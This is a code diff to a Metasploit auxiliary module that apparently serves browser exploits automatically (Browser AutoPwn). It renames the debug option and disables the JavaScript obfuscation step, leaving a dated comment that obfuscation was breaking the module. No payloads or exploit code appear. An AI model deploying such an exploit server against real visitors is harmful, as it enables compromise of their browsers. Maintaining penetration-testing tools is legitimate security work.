@@ -75,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
       OptRegexp.new('EXCLUDE', [false,
         'Only attempt to use exploits whose name DOES NOT match this regex'
       ]),
-      OptBool.new('DEBUG', [false,
+      OptBool.new('DEBUG_AUTOPWN', [false,
         'Do not obfuscate the javascript and print various bits of useful info to the browser',
         false
       ]),
@@ -232,13 +232,18 @@ class Metasploit3 < Msf::Auxiliary
     ENDJS
     )
 
-    if (datastore['DEBUG'])
-      print_debug("NOTE: Debug Mode; javascript will not be obfuscated")
+    if (datastore['DEBUG_AUTOPWN'])
+      print_status("NOTE: Debug Mode; javascript will not be obfuscated")
     else
       pre = Time.now
-      print_status("Obfuscating initial javascript #{pre}")
-      @init_js.obfuscate
-      print_status "Done in #{Time.now - pre} seconds"
+
+      #
+      # 2/12/2015: Obfuscation is disabled because this is currently breaking BrowserAutoPwn
+      #
+
+      #print_status("Obfuscating initial javascript #{pre}")
+      #@init_js.obfuscate
+      #print_status "Done in #{Time.now - pre} seconds"
     end
 
     #@init_js << "window.onload = #{@init_js.sym("bodyOnLoad")};";
@@ -344,7 +349,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # For testing, set the exploit uri to the name of the exploit so it's
     # easy to tell what is happening from the browser.
-    if (datastore['DEBUG'])
+    if (datastore['DEBUG_AUTOPWN'])
       @exploits[name].datastore['URIPATH'] = name
     else
       # randomize it manually since if a saved value exists in the user's
@@ -826,8 +831,12 @@ class Metasploit3 < Msf::Auxiliary
     js << "#{js_debug("'starting exploits (' + global_exploit_list.length + ' total)<br>'")}\n"
     js << "window.next_exploit(0);\n"
 
-    js = ::Rex::Exploitation::JSObfu.new(js)
-    js.obfuscate unless datastore["DEBUG"]
+    #
+    # 2/12/2015: Obfuscation is disabled because this is currently breaking BrowserAutoPwn
+    #
+
+    #js = ::Rex::Exploitation::JSObfu.new(js)
+    #js.obfuscate unless datastore["DEBUG_AUTOPWN"]
 
     response.body = "#{js}"
     print_status("Responding with #{sploit_cnt} exploits")
@@ -1047,7 +1056,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def js_debug(msg)
-    if datastore['DEBUG']
+    if datastore['DEBUG_AUTOPWN']
       return "document.body.innerHTML += #{msg};"
     end
     return ""
